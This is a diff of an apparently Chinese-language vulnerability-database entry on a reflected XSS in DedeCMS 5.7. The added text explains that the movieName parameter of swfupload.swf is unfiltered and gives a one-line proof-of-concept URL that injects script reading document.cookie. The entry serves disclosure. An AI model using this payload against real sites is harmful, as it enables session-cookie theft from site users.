@@ -1,14 +1,20 @@
----
-title: 'Dedecms swf文件反射型xss'
-date: Thu, 24 Sep 2020 01:29:26 +0000
-draft: false
-tags: ['白阁-漏洞库']
----
+# Dedecms swf文件反射型xss
 
-### 漏洞影响
+## 漏洞简介
+
+DedeCMS 5.7 /images/swfupload/swfupload.swf文件movieName参数没有合适过滤，导致跨站脚本漏洞。
+
+### 漏洞影响版本
 
 DedeCMS 5.7
 
+## 文件位置
+
+漏洞文件为：http://127.0.0.1/images/swfupload/swfupload.swf
+
 ### 漏洞POC
 
-![](Dedecms%20swf%E6%96%87%E4%BB%B6%E5%8F%8D%E5%B0%84%E5%9E%8Bxss/16009109271.png)
+```
+http://127.0.0.1/images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert(document.cookie)}}//
+```
+
